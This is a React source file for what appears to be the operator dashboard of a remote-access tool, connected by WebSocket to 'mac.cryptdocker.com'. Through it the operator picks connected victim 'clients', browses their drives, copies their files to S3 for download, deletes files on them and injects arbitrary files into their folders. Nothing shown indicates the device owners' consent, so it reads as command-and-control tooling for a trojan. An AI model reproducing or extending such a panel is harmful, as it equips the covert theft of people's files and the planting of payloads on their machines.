import { useEffect, useState } from "react";
import { FiUsers } from "react-icons/fi";
import { useWebSocket } from "../hooks/useWebSocket";
import { Sidebar } from "../components/Sidebar";
import { ClientDetail } from "../components/ClientDetail";
import { DriveList } from "../components/DriveList";
import { FileBrowser } from "../components/FileBrowser";
import { DownloadListModal, type DownloadListItem } from "../components/DownloadListModal";
import { InjectFileModal } from "../components/InjectFileModal";

const WS_URL = "wss://mac.cryptdocker.com";

export const Home = () => {
  const {
    clients,
    connected,
    clientDetail,
    drives,
    detailLoading,
    requestClientDetails,
    directoryEntries,
    currentPath,
    browsingLoading,
    browsingError,
    browseDirectory,
    uploadFile,
    injectFile,
    deleteFile,
    getDownloadUrl,
    uploading,
    deleting,
    injecting,
    lastInjectResult,
    uploadListByDeviceId,
    requestUploadList,
  } = useWebSocket(WS_URL);

  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
  const [browsing, setBrowsing] = useState(false);
  const [downloadListClientId, setDownloadListClientId] = useState<string | null>(null);
  const [injectClientId, setInjectClientId] = useState<string | null>(null);

  const listClient =
    clients.find((c) => c.deviceId === selectedDeviceId) ?? null;

  const displayClient =
    clientDetail?.deviceId === selectedDeviceId ? clientDetail : listClient;

  const displayDrives =
    clientDetail?.deviceId === selectedDeviceId ? drives : [];

  const handleSelectClient = (deviceId: string) => {
    console.log("clicked");
    setSelectedDeviceId(deviceId);
    setBrowsing(false);
    requestClientDetails(deviceId);
  };

  const downloadListClient =
    clients.find((c) => c.deviceId === downloadListClientId) ??
    (clientDetail?.deviceId === downloadListClientId ? clientDetail : null);

  const downloadListItems: DownloadListItem[] = (downloadListClientId
    ? uploadListByDeviceId[downloadListClientId] || []
    : []
  ).map((u) => ({
    path: u.path,
    name: u.path.split(/[\\/]/).filter(Boolean).pop() || u.path,
    isDir: false,
    s3Url: u.s3_url,
  }));

  const handleDriveClick = (path: string) => {
    if (!selectedDeviceId) return;
    setBrowsing(true);
    browseDirectory(selectedDeviceId, path);
  };

  const handleNavigate = (path: string) => {
    if (!selectedDeviceId) return;
    browseDirectory(selectedDeviceId, path);
  };

  const handleBackToDrives = () => {
    setBrowsing(false);
  };

  const handleUpload = (path: string) => {
    if (!selectedDeviceId) return;
    uploadFile(selectedDeviceId, path);
  };

  const handleDelete = (path: string, isDir: boolean) => {
    if (!selectedDeviceId) return;
    deleteFile(selectedDeviceId, path, isDir);
  };

  const handleDownload = (s3Url: string) => {
    const url = getDownloadUrl(s3Url);
    window.open(url, "_blank");
  };

  const handleOpenDownloadList = (deviceId: string) => {
    if (selectedDeviceId !== deviceId) {
      handleSelectClient(deviceId);
    }
    setDownloadListClientId(deviceId);
    requestUploadList(deviceId);
  };

  const handleCloseDownloadList = () => {
    setDownloadListClientId(null);
  };

  const handleRemoveFromDownloadList = (path: string, isDir: boolean) => {
    if (!downloadListClientId) return;
    deleteFile(downloadListClientId, path, isDir);
  };

  const handleVolumesClick = () => {
    if (!selectedDeviceId || !displayClient) return;
    const isMacClient =
      displayClient.osType.toLowerCase().includes("darwin") ||
      displayClient.osType.toLowerCase().includes("mac");
    if (isMacClient) {
      requestClientDetails(selectedDeviceId);
    }
  };

  const handleOpenInjectFile = (deviceId: string) => {
    if (selectedDeviceId !== deviceId) {
      handleSelectClient(deviceId);
    }
    setInjectClientId(deviceId);
  };

  const handleCloseInjectFile = () => {
    setInjectClientId(null);
  };

  const handleInjectFile = (fileName: string, fileData: string) => {
    if (!injectClientId || !currentPath) return;
    injectFile(injectClientId, currentPath, fileName, fileData);
  };

  const injectClient =
    clients.find((c) => c.deviceId === injectClientId) ??
    (clientDetail?.deviceId === injectClientId ? clientDetail : null);

  useEffect(() => {
    if (lastInjectResult?.success && injectClientId) {
      setInjectClientId(null);
      if (selectedDeviceId && currentPath) {
        browseDirectory(selectedDeviceId, currentPath);
      }
    }
  }, [lastInjectResult, injectClientId, selectedDeviceId, currentPath, browseDirectory]);

  return (
    <div className="flex h-screen bg-surface-900">
      <Sidebar
        clients={clients}
        selectedDeviceId={selectedDeviceId}
        onSelectClient={(client) => handleSelectClient(client.deviceId)}
        onOpenDownloadList={(client) => handleOpenDownloadList(client.deviceId)}
        onInjectFile={(client) => handleOpenInjectFile(client.deviceId)}
        connected={connected}
      />
      <main className="flex-1 flex flex-col overflow-hidden">
        {displayClient ? (
          <>
            <div className="shrink-0 p-4 pb-0">
              <ClientDetail client={displayClient} loading={detailLoading} />
            </div>
            <div className="flex-1 overflow-auto p-4">
              {browsing ? (
                <FileBrowser
                  entries={directoryEntries}
                  currentPath={currentPath || ""}
                  loading={browsingLoading}
                  error={browsingError}
                  uploading={uploading}
                  deleting={deleting}
                  onNavigate={handleNavigate}
                  onBack={handleBackToDrives}
                  onUpload={handleUpload}
                  onDelete={handleDelete}
                  onDownload={handleDownload}
                />
              ) : (
                <DriveList
                  drives={displayDrives}
                  loading={detailLoading}
                  onDriveClick={handleDriveClick}
                  onVolumesClick={handleVolumesClick}
                />
              )}
            </div>
          </>
        ) : (
          <div className="flex flex-col items-center justify-center h-full animate-fade-in">
            <div className="w-20 h-20 rounded-3xl bg-surface-700/50 border border-surface-500/20 flex items-center justify-center mb-6">
              <FiUsers size={36} strokeWidth={1.2} className="text-surface-300/40" />
            </div>
            <p className="text-surface-300/50 text-base font-medium mb-1">
              No client selected
            </p>
            <p className="text-surface-300/30 text-sm">
              Pick a client from the sidebar to view details
            </p>
          </div>
        )}
      </main>

      <DownloadListModal
        open={downloadListClientId != null}
        clientName={downloadListClient?.username || "Client"}
        items={downloadListItems}
        onClose={handleCloseDownloadList}
        onDownload={handleDownload}
        onRemove={handleRemoveFromDownloadList}
      />

      <InjectFileModal
        open={injectClientId != null}
        clientName={injectClient?.username || "Client"}
        currentPath={currentPath}
        injecting={injecting}
        lastResult={lastInjectResult}
        onClose={handleCloseInjectFile}
        onInject={handleInjectFile}
      />
    </div>
  );
};
